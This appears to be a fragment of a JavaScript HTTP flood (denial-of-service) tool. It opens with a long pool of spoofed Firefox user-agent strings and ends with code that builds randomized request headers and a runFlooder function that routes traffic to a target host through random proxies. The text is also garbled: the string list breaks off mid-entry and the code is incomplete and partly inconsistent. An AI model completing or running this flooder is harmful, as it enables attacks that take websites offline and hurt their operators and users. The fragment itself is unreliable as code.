Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 RubarToolbar2714
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.1) Gecko/20090715 MRA 5.7 (build 03796) Firefox/3.5.1 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.7 (build 03797) Firefox/3.6.3 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.7 (build 03796) Firefox/3.6.3 sputnik 2.3.0.102
Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 (9DBA1301-EA7D-696D-A96C-ECD93593F0C2) Firefox/26.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.2) Gecko/20100316 MRA 5.4 (build 02647) Firefox/3.6.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03790) Firefox/3.6.13 (.NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729) sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.5) Gecko/2008120122 MRA 5.4 (build 02652) Firefox/3.0.5
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 GTB7.1 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9b4) Gecko/2008030317 Firefox/3.0b4
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.0.12) Gecko/20070508 MRA 5.7 (build 03797) Firefox/1.5.0.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03796) Firefox/3.6.12 ( .NET CLR 3.5.30729) sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03686) Firefox/3.6.13 sputnik 2.4.0.33
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.7 (build 03796) Firefox/3.5.16 sputnik 2.3.0.101
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03403) Firefox/3.6.13 GTB7.1 ( .NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.6 (build 03402) Firefox/3.5.6
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0C) sputnik 2.4.0.32 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbPTV2/3.9.1.14019 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 GTB7.1
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14 sputnik 2.4.0.46
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 MRA 5.5 (build 02842) Firefox/3.6.14 (.NET CLR 3.5.30729) sputnik 2.3.0.94
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 MRA 5.4 (build 02625) Firefox/3.6.14
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.14) Gecko/20110218 AskTbPTV2/3.9.1.14019 Firefox/3.6.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.17) Gecko/20110121 Firefox/3.5.17 sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03790) Firefox/3.6.8 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14 sputnik 2.3.0.94
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.17) Gecko/20110121 MRA 5.6 (build 03278) Firefox/3.5.17
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 MRA 5.7 (build 03796) Firefox/3.6.14 ( .NET CLR 3.5.30729) sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.14) Gecko/20110218 AskTbCLM/3.9.1.14019 Firefox/3.6.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.17) Gecko/20110121 MRA 5.7 (build 03796) AdCentriaIM/1.7 Firefox/3.5.17 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 MRA 5.6 (build 03402) Firefox/3.6.23 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 MRA 5.7 (build 03796) Firefox/3.6.14 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.7) Gecko/20100701 MRA 5.7 (build 03797) Firefox/3.6.7 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14 sputnik 2.3.0.94
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 MRA 5.6 (build 03392) Firefox/3.5.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14 GTB7.1 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03790) Firefox/3.6.10 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.14) Gecko/20110218 MRA 5.7 (build 03797) Firefox/3.6.14 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03278) Firefox/3.6.13 ( .NET CLR 3.5.21022)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.5 (build 02842) Firefox/3.6.15 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.7 (build 03796) Firefox/3.6.6 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.17) Gecko/20110121 Firefox/3.5.17 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 MRA 5.7 (build 03755) Firefox/3.6.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 MRA 5.7 (build 03796) Firefox/3.6.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.7 (build 03797) Firefox/3.5.6 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 GTB7.1 (.NET CLR 3.0.4506.2152)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03790) Firefox/3.6.13 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.4 (build 02652) Firefox/3.6.15 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03658) Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 (.NET CLR 3.5.30729) RubarToolbar2714
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 sputnik 2.3.0.96 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.6 (build 03278) Firefox/3.6.15 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.0.12) Gecko/20070508 MRA 5.6 (build 03278) Firefox/1.5.0.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 AskTbFXTV5/3.9.1.14019 Firefox/3.6.14 ( .NET CLR 3.5.30729) sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 3402) Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 RubarToolbar2714
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.17) Gecko/20110121 Firefox/3.5.17 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 MRA 5.7 (build 03686) Firefox/3.6.14
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 ( .NET CLR 3.5.30729; .NET4.0C) sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.14) Gecko/20110218 MRA 5.7 (build 03790) Firefox/3.6.14 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 BTRS26718 Firefox/3.6.15 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03796) Firefox/3.6.15 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14 ( .NET CLR 3.5.30729) RubarToolbar2714
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.7 (build 03796) Firefox/3.6 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbMNC/3.9.1.14019 Firefox/3.6.13 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03658) Firefox/3.6.15 sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 sputnik 2.3.0.94
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03790) Firefox/3.6.15 ( .NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03796) Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03797) Firefox/3.6.15 ( .NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.5 (build 02842) Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 ( .NET CLR 3.5.30729; .NET4.0C) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.17) Gecko/20110121 MRA 5.7 (build 03796) Firefox/3.5.17 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.9) Gecko/2009040821 Firefox/3.0.9 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03796) Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03789) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.17) Gecko/20110121 MRA 5.7 (build 03796) Firefox/3.5.17 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.17) Gecko/20110121 MRA 5.6 (build 03403) Firefox/3.5.17 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03797) Firefox/3.6.13 sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.17) Gecko/20110121 Firefox/3.5.17 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.17) Gecko/20110121 MRA 5.7 (build 03686) Firefox/3.5.17 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 AskTbPCW/3.9.1.14019 Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03796) Firefox/3.6.15 ( )
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03686) Firefox/3.6.15 sputnik 2.3.0.86
Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.0.10) Gecko/2009042716 Firefox/3.0.10
Mozilla/5.0 (Windows NT 6.2; WOW64; rv:24.0) Gecko/20131030 Firefox/24.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 AdCentriaIM/1.7 Firefox/3.6.15 ImageShackToolbar/5.2.5 ( .NET CLR 3.5.30729; .NET4.0E) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.1) Gecko/20090715 MRA 5.3 (build 02560) Firefox/3.5.1
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03789) Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03797) Firefox/3.6.15 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.4.0.48
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.0.19) Gecko/2010040116 Ubuntu/9.04 (jaunty) Firefox/3.0.19
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 GTB7.1 (.NET Client 3.5.30729.01)
Mozilla/5.0 (Windows NT 5.1; rv:10.0.8) Gecko/20100101 Firefox/10.0.8
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.15) Gecko/20110303 AskTbPTV/3.9.1.14019 Firefox/3.6.15 (.NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.5.3.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03773) Firefox/3.6.15 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03797) AskTbSPC2/3.9.1.14019 Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14
Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03796) Firefox/3.6.15 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2) Gecko/20100115 AskTbPTV2/3.9.1.14019 Firefox/3.6 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03797) Firefox/3.6.15 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03796) Firefox/3.6.15 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03796) Firefox/3.6.15 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 sputnik 2.4.0.48
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.15) Gecko/20110303 Ubuntu/10.10 (maverick) Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03797) Firefox/3.6.15 ( .NET CLR 3.5.30729) sputnik 2.3.0.101
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbTKR/3.9.1.14019 Firefox/3.6.13 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.6 (build 03278) Firefox/3.6.15 sputnik 2.4.0.32 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 sputnik 2.3.0.66
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03796) AskTbX-SD/3.9.1.14019 Firefox/3.6.15 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.7 (build 03757) Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03672) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03789) Firefox/3.6.15 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.6 (build 03402) Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 (2F8AC2AE-A5CB-E16C-D63B-07DCC9E336ED) MRA 5.5 (build 02842) Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 sputnik 2.4.0.30
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 AskTbVD/3.9.1.14019 Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03790) Firefox/3.6.15 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03789) Firefox/3.6.15 ( .NET CLR 3.5.30729) sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03686) Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03790) Firefox/3.6.15 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.15) Gecko/20110303 MRA 5.6 (build 03278) Firefox/3.6.15 ( .NET CLR 3.5.21022)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.8.1.4) Gecko/20070717 Firefox/2.0.0.4
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 (.NET CLR 3.5.30729) sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik 2.3.0.88
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.19) Gecko/2010040118 Ubuntu/8.10 (intrepid) Firefox/3.0.19
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 sputnik 2.3.0.101 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 sputnik 2.3.0.88
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 (.NET CLR 3.5.30729) sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 AskTbSTT/3.11.3.15590 Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 AskTbMYC-ST/3.11.3.15590 Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 GTB7.1 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03796) Firefox/3.6.16 ( .NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.18) Gecko/20110319 Firefox/3.5.18 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 ( .NET CLR 3.0.04506.30)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 sputnik 2.4.0.36
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.18) Gecko/20110319 Firefox/3.5.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03797) Firefox/3.6.15 RubarToolbar2714
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 RubarToolbar2714
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 GTB7.1 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.3.0.101
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Window"];


  const Header = new NetSocket();
  headers[":method"] = "GET";
  headers[":path"] = parsedTarget.path;
  headers[":scheme"] = "https";
  headers[":authority"] = randomString(10) + "http://" + parsedTarget.host;
  headers["accept"] = randomHeaders['accept'];
  headers["Accept-Encoding"] = "gzip, deflate, br";
  headers["accept-language"] = headerFunc.lang();
  headers["accept-encoding"] = headerFunc.encoding();
  headers["Connection"] = Math.random() > 0.5 ? "keep-alive" : "close";
  headers["upgrade-insecure-requests"] = Math.random() > 0.5;
  headers["x-requested-with"] = "XMLHttpRequest";
  headers["pragma"] = Math.random() > 0.5 ? "no-cache" : "max-age=25000";
  headers["cache-control"] = Math.random() > 0.5 ? "no-cache" : "max-age=30000";

 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     headers[":authority"] = parsedTarget.host
     headers["user-agent"] = userAgent();
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 25000
     };

